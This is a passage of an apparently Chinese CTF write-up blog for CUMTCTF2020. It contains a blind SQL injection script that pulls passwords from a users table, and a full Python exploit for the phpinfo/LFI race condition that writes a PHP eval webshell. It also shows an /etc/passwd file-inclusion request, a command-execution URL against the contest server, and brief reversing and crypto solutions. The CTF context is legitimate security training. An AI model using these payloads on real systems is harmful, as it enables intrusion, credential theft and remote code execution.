dict:</span><br><span class=\"line\">        <span class=\"comment\">#payload = \"or/**/1=(case/**/when/**/(left(database(),&#123;&#125;)=0x&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)#\".format(i, binascii.b2a_hex(j + a))</span></span><br><span class=\"line\">        <span class=\"comment\">#payload = \"or/**/1=(case/**/when/**/(left((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;&#125;)=0x&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)#\".format(i,binascii.b2a_hex(j+a))</span></span><br><span class=\"line\">        <span class=\"comment\">#payload = \"or/**/1=(case/**/when/**/(left((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x7573657273),&#123;&#125;)=0x&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)#\".format(i,binascii.b2a_hex(j + a))</span></span><br><span class=\"line\">        payload = <span class=\"string\">\"or/**/1=(case/**/when/**/(left((select/**/group_concat(password)/**/from/**/users),&#123;&#125;)=0x&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)#\"</span>.format(i, binascii.b2a_hex(j + a))</span><br><span class=\"line\">        <span class=\"comment\">#print(payload)</span></span><br><span class=\"line\">        <span class=\"comment\">#cumtctf</span></span><br><span class=\"line\">        <span class=\"comment\">#emails users</span></span><br><span class=\"line\">        <span class=\"comment\">#id id username,password</span></span><br><span class=\"line\">        data = &#123;</span><br><span class=\"line\">            <span class=\"string\">'username'</span> : <span class=\"string\">\"100\\\\\"</span>,</span><br><span class=\"line\">            <span class=\"string\">'password'</span> : payload</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        r = requests.session()</span><br><span class=\"line\">        res = r.post(url=url,data=data)</span><br><span class=\"line\">        <span class=\"comment\">#print(res.content)</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">'Wrong username'</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> res.content:</span><br><span class=\"line\">            j += a</span><br><span class=\"line\">            flag +=a</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    print(flag)</span><br></pre></td></tr></table></figure>\n<p>好像是在最后，多跑一会就出来了</p>\n<h2 id=\"Try-GET-file\"><a href=\"#Try-GET-file\" class=\"headerlink\" title=\"Try:GET_file\"></a>Try:GET_file</h2><p>先扫目录发现有phpinfo.php</p>\n<p>包含一下发现有文件包含漏洞</p>\n<p>之后又包含敏感文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/09/25/CUMTCTF2020/image-20200925185651724.png\" alt=\"image-20200925185651724\"></p>\n<p>这里有一个phpinfo上传文件再包含</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">在给PHP发送POST数据包时，如果数据包里包含文件区块，无论访问的代码中是否有处理文件上传的逻辑，php都会将这个文件保存成一个临时文件（通常是&#x2F;tmp&#x2F;php[6个随机字符]），这个临时文件在请求结束后就会被删除，同时，phpinfo页面会将当前请求上下文中所有变量都打印出来。但是文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，将这个文件名发送给文件包含漏洞页面。</span><br><span class=\"line\"></span><br><span class=\"line\">因为在第一个请求结束时，临时文件就会被删除，第二个请求就无法进行包含。</span><br><span class=\"line\"></span><br><span class=\"line\">但是这并不代表我们没有办法去利用这点上传恶意文件，只要发送足够多的数据，让页面还未反应过来，就上传我们的恶意文件，然后文件包含：</span><br><span class=\"line\"></span><br><span class=\"line\">1）发送包含了webshell的上传数据包给phpinfo，这个数据包的header，get等位置一定要塞满垃圾数据；</span><br><span class=\"line\"></span><br><span class=\"line\">2）phpinfo这时会将所有数据都打印出来，其中的垃圾数据会将phpinfo撑得非常大</span><br><span class=\"line\"></span><br><span class=\"line\">3）PHP默认缓冲区大小是4096，即PHP每次返回4096个字节给socket连接</span><br><span class=\"line\"></span><br><span class=\"line\">4）所以，我们直接操作原生socket，每次读取4096个字节，只要读取到的字符里包含临时文件名，就立即发送第二个数据包</span><br><span class=\"line\"></span><br><span class=\"line\">5）此时，第一个数据包的socket连接其实还没有结束，但是PHP还在继续每次输出4096个字节，所以临时文件还未被删除</span><br><span class=\"line\"></span><br><span class=\"line\">6）我们可以利用这个时间差，成功包含临时文件，最后getshell</span><br></pre></td></tr></table></figure>\n<p>这里有现成的exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python </span></span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">setup</span><span class=\"params\">(host, port)</span>:</span></span><br><span class=\"line\">    TAG=<span class=\"string\">\"Security Test\"</span></span><br><span class=\"line\">    PAYLOAD=<span class=\"string\">\"\"\"%s\\r</span></span><br><span class=\"line\"><span class=\"string\">&lt;?php file_put_contents('/tmp/g', '&lt;?=eval($_REQUEST[1])?&gt;')?&gt;\\r\"\"\"</span> % TAG</span><br><span class=\"line\">    REQ1_DATA=<span class=\"string\">\"\"\"-----------------------------7dbff1ded0714\\r</span></span><br><span class=\"line\"><span class=\"string\">Content-Disposition: form-data; name=\"dummyname\"; filename=\"test.txt\"\\r</span></span><br><span class=\"line\"><span class=\"string\">Content-Type: text/plain\\r</span></span><br><span class=\"line\"><span class=\"string\">\\r</span></span><br><span class=\"line\"><span class=\"string\">%s</span></span><br><span class=\"line\"><span class=\"string\">-----------------------------7dbff1ded0714--\\r\"\"\"</span> % PAYLOAD</span><br><span class=\"line\">    padding=<span class=\"string\">\"A\"</span> * <span class=\"number\">5000</span></span><br><span class=\"line\">    REQ1=<span class=\"string\">\"\"\"POST /phpinfo.php?a=\"\"\"</span>+padding+<span class=\"string\">\"\"\" HTTP/1.1\\r</span></span><br><span class=\"line\"><span class=\"string\">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=\"\"\"</span>+padding+<span class=\"string\">\"\"\"\\r</span></span><br><span class=\"line\"><span class=\"string\">HTTP_ACCEPT: \"\"\"</span> + padding + <span class=\"string\">\"\"\"\\r</span></span><br><span class=\"line\"><span class=\"string\">HTTP_USER_AGENT: \"\"\"</span>+padding+<span class=\"string\">\"\"\"\\r</span></span><br><span class=\"line\"><span class=\"string\">HTTP_ACCEPT_LANGUAGE: \"\"\"</span>+padding+<span class=\"string\">\"\"\"\\r</span></span><br><span class=\"line\"><span class=\"string\">HTTP_PRAGMA: \"\"\"</span>+padding+<span class=\"string\">\"\"\"\\r</span></span><br><span class=\"line\"><span class=\"string\">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\\r</span></span><br><span class=\"line\"><span class=\"string\">Content-Length: %s\\r</span></span><br><span class=\"line\"><span class=\"string\">Host: %s\\r</span></span><br><span class=\"line\"><span class=\"string\">\\r</span></span><br><span class=\"line\"><span class=\"string\">%s\"\"\"</span> %(len(REQ1_DATA),host,REQ1_DATA)</span><br><span class=\"line\">    <span class=\"comment\">#modify this to suit the LFI script   </span></span><br><span class=\"line\">    LFIREQ=<span class=\"string\">\"\"\"GET /index.php?file=%s HTTP/1.1\\r</span></span><br><span class=\"line\"><span class=\"string\">User-Agent: Mozilla/4.0\\r</span></span><br><span class=\"line\"><span class=\"string\">Proxy-Connection: Keep-Alive\\r</span></span><br><span class=\"line\"><span class=\"string\">Host: %s\\r</span></span><br><span class=\"line\"><span class=\"string\">\\r</span></span><br><span class=\"line\"><span class=\"string\">\\r</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> (REQ1, TAG, LFIREQ)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">phpInfoLFI</span><span class=\"params\">(host, port, phpinforeq, offset, lfireq, tag)</span>:</span></span><br><span class=\"line\">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\"></span><br><span class=\"line\">    s.connect((host, port))</span><br><span class=\"line\">    s2.connect((host, port))</span><br><span class=\"line\"></span><br><span class=\"line\">    s.send(phpinforeq)</span><br><span class=\"line\">    d = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> len(d) &lt; offset:</span><br><span class=\"line\">        d += s.recv(offset)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        i = d.index(<span class=\"string\">\"[tmp_name] =&amp;gt; \"</span>)</span><br><span class=\"line\">        fn = d[i+<span class=\"number\">17</span>:i+<span class=\"number\">31</span>]</span><br><span class=\"line\">    <span class=\"keyword\">except</span> ValueError:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\">    s2.send(lfireq % (fn, host))</span><br><span class=\"line\">    d = s2.recv(<span class=\"number\">4096</span>)</span><br><span class=\"line\">    s.close()</span><br><span class=\"line\">    s2.close()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> d.find(tag) != <span class=\"number\">-1</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> fn</span><br><span class=\"line\"></span><br><span class=\"line\">counter=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ThreadWorker</span><span class=\"params\">(threading.Thread)</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, e, l, m, *args)</span>:</span></span><br><span class=\"line\">        threading.Thread.__init__(self)</span><br><span class=\"line\">        self.event = e</span><br><span class=\"line\">        self.lock =  l</span><br><span class=\"line\">        self.maxattempts = m</span><br><span class=\"line\">        self.args = args</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">global</span> counter</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"keyword\">not</span> self.event.is_set():</span><br><span class=\"line\">            <span class=\"keyword\">with</span> self.lock:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> counter &gt;= self.maxattempts:</span><br><span class=\"line\">                    <span class=\"keyword\">return</span></span><br><span class=\"line\">                counter+=<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                x = phpInfoLFI(*self.args)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> self.event.is_set():</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>                </span><br><span class=\"line\">                <span class=\"keyword\">if</span> x:</span><br><span class=\"line\">                    <span class=\"keyword\">print</span> <span class=\"string\">\"\\nGot it! Shell created in /tmp/g\"</span></span><br><span class=\"line\">                    self.event.set()</span><br><span class=\"line\">                    </span><br><span class=\"line\">            <span class=\"keyword\">except</span> socket.error:</span><br><span class=\"line\">                <span class=\"keyword\">return</span></span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getOffset</span><span class=\"params\">(host, port, phpinforeq)</span>:</span></span><br><span class=\"line\">    <span class=\"string\">\"\"\"Gets offset of tmp_name in the php output\"\"\"</span></span><br><span class=\"line\">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">    s.connect((host,port))</span><br><span class=\"line\">    s.send(phpinforeq)</span><br><span class=\"line\">    </span><br><span class=\"line\">    d = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        i = s.recv(<span class=\"number\">4096</span>)</span><br><span class=\"line\">        d+=i        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> i == <span class=\"string\">\"\"</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"comment\"># detect the final chunk</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> i.endswith(<span class=\"string\">\"0\\r\\n\\r\\n\"</span>):</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    s.close()</span><br><span class=\"line\">    i = d.find(<span class=\"string\">\"[tmp_name] =&amp;gt; \"</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> i == <span class=\"number\">-1</span>:</span><br><span class=\"line\">        <span class=\"keyword\">raise</span> ValueError(<span class=\"string\">\"No php tmp_name in phpinfo output\"</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"found %s at %i\"</span> % (d[i:i+<span class=\"number\">10</span>],i)</span><br><span class=\"line\">    <span class=\"comment\"># padded up a bit</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> i+<span class=\"number\">256</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"LFI With PHPInfo()\"</span></span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"-=\"</span> * <span class=\"number\">30</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> len(sys.argv) &lt; <span class=\"number\">2</span>:</span><br><span class=\"line\">        <span class=\"keyword\">print</span> <span class=\"string\">\"Usage: %s host [port] [threads]\"</span> % sys.argv[<span class=\"number\">0</span>]</span><br><span class=\"line\">        sys.exit(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        host = socket.gethostbyname(sys.argv[<span class=\"number\">1</span>])</span><br><span class=\"line\">    <span class=\"keyword\">except</span> socket.error, e:</span><br><span class=\"line\">        <span class=\"keyword\">print</span> <span class=\"string\">\"Error with hostname %s: %s\"</span> % (sys.argv[<span class=\"number\">1</span>], e)</span><br><span class=\"line\">        sys.exit(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    port=<span class=\"number\">80</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        port = int(sys.argv[<span class=\"number\">2</span>])</span><br><span class=\"line\">    <span class=\"keyword\">except</span> IndexError:</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> ValueError, e:</span><br><span class=\"line\">        <span class=\"keyword\">print</span> <span class=\"string\">\"Error with port %d: %s\"</span> % (sys.argv[<span class=\"number\">2</span>], e)</span><br><span class=\"line\">        sys.exit(<span class=\"number\">1</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    poolsz=<span class=\"number\">10</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        poolsz = int(sys.argv[<span class=\"number\">3</span>])</span><br><span class=\"line\">    <span class=\"keyword\">except</span> IndexError:</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> ValueError, e:</span><br><span class=\"line\">        <span class=\"keyword\">print</span> <span class=\"string\">\"Error with poolsz %d: %s\"</span> % (sys.argv[<span class=\"number\">3</span>], e)</span><br><span class=\"line\">        sys.exit(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"Getting initial offset...\"</span>,  </span><br><span class=\"line\">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class=\"line\">    offset = getOffset(host, port, reqphp)</span><br><span class=\"line\">    sys.stdout.flush()</span><br><span class=\"line\"></span><br><span class=\"line\">    maxattempts = <span class=\"number\">1000</span></span><br><span class=\"line\">    e = threading.Event()</span><br><span class=\"line\">    l = threading.Lock()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"Spawning worker pool (%d)...\"</span> % poolsz</span><br><span class=\"line\">    sys.stdout.flush()</span><br><span class=\"line\"></span><br><span class=\"line\">    tp = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,poolsz):</span><br><span class=\"line\">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> tp:</span><br><span class=\"line\">        t.start()</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"keyword\">not</span> e.wait(<span class=\"number\">1</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> e.is_set():</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> l:</span><br><span class=\"line\">                sys.stdout.write( <span class=\"string\">\"\\r% 4d / % 4d\"</span> % (counter, maxattempts))</span><br><span class=\"line\">                sys.stdout.flush()</span><br><span class=\"line\">                <span class=\"keyword\">if</span> counter &gt;= maxattempts:</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">print</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> e.is_set():</span><br><span class=\"line\">            <span class=\"keyword\">print</span> <span class=\"string\">\"Woot!  \\m/\"</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">print</span> <span class=\"string\">\":(\"</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> KeyboardInterrupt:</span><br><span class=\"line\">        <span class=\"keyword\">print</span> <span class=\"string\">\"\\nTelling threads to shutdown...\"</span></span><br><span class=\"line\">        e.set()</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"Shuttin' down...\"</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> tp:</span><br><span class=\"line\">        t.join()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n<p>payload：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;202.119.201.197:13077&#x2F;?file&#x3D;&#x2F;tmp&#x2F;g&amp;1&#x3D;system(%27cat%20&#x2F;tmp&#x2F;7IDUrqGOt8PMATm852&#x2F;flag.txt%27);</span><br><span class=\"line\">#CUMTCTF&#123;Orz_to_php1nf0&#125;</span><br></pre></td></tr></table></figure>\n<p>最后直接命令执行，但好像找了好久才看见flag</p>\n<h1 id=\"re\"><a href=\"#re\" class=\"headerlink\" title=\"re\"></a>re</h1><h2 id=\"连个签到的分都不给你\"><a href=\"#连个签到的分都不给你\" class=\"headerlink\" title=\"连个签到的分都不给你\"></a>连个签到的分都不给你</h2><p>直接010查看搜cumtctf可以看见flag</p>\n<h2 id=\"python题禁止py\"><a href=\"#python题禁止py\" class=\"headerlink\" title=\"python题禁止py\"></a>python题禁止py</h2><p>直接上脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># flag = input()</span></span><br><span class=\"line\">cipher = [<span class=\"number\">80</span>,<span class=\"number\">70</span>,<span class=\"number\">94</span>,<span class=\"number\">71</span>,<span class=\"number\">80</span>,<span class=\"number\">71</span>,<span class=\"number\">85</span>,<span class=\"number\">104</span>,<span class=\"number\">86</span>,<span class=\"number\">39</span>,<span class=\"number\">64</span>,<span class=\"number\">106</span>,<span class=\"number\">76</span>,<span class=\"number\">67</span>,<span class=\"number\">106</span>,<span class=\"number\">71</span>,<span class=\"number\">123</span>,<span class=\"number\">92</span>,<span class=\"number\">125</span>,<span class=\"number\">76</span>,<span class=\"number\">37</span>,<span class=\"number\">106</span>,<span class=\"number\">103</span>,<span class=\"number\">118</span>,<span class=\"number\">80</span>,<span class=\"number\">35</span>,<span class=\"number\">119</span>,<span class=\"number\">32</span>,<span class=\"number\">110</span>]</span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># if(len(flag==29)):</span></span><br><span class=\"line\"><span class=\"comment\">#     for i,n in enumerate(flag):</span></span><br><span class=\"line\"><span class=\"comment\">#         if ord(n) ^ 19 != cipher[i]:</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># else:</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> cipher:</span><br><span class=\"line\">    a = i ^ <span class=\"number\">19</span></span><br><span class=\"line\">    print(chr(a),end=<span class=\"string\">''</span>)</span><br></pre></td></tr></table></figure>\n<h2 id=\"兄弟们快来帮帮萄萄\"><a href=\"#兄弟们快来帮帮萄萄\" class=\"headerlink\" title=\"兄弟们快来帮帮萄萄\"></a>兄弟们快来帮帮萄萄</h2><p>脱壳拖入IDA可以看见flag</p>\n<h1 id=\"pwn\"><a href=\"#pwn\" class=\"headerlink\" title=\"pwn\"></a>pwn</h1><h2 id=\"test-nc\"><a href=\"#test-nc\" class=\"headerlink\" title=\"test_nc\"></a>test_nc</h2><p>nc 监听领flag</p>\n<h2 id=\"babystack\"><a href=\"#babystack\" class=\"headerlink\" title=\"babystack\"></a>babystack</h2><p>脱入010并输入字符串看是直接可以bash</p>\n<p>直接读取就可以拿flag</p>\n<h1 id=\"crypto\"><a href=\"#crypto\" class=\"headerlink\" title=\"crypto\"></a>crypto</h1><h2 id=\"幼儿园的密码题\"><a href=\"#幼儿园的密码题\" class=\"headerlink\" title=\"幼儿园的密码题\"></a>幼儿园的密码题</h2><p>rsa，已知e n c 求m</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># e = 0x10001</span></span><br><span class=\"line\"><span class=\"comment\"># n = 0xeb80cc09ed9780fe25cadf7c168d2da3ea24e35237e92faf5ee0d7980c11302f</span></span><br><span class=\"line\"><span class=\"comment\"># c = 0x596d5175112e346590aae5a3d633e71d2d12b28b60f08f8efa82fc092acc8c2d</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Hint ： google RS</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> gmpy2</span><br><span class=\"line\"><span class=\"keyword\">from</span> 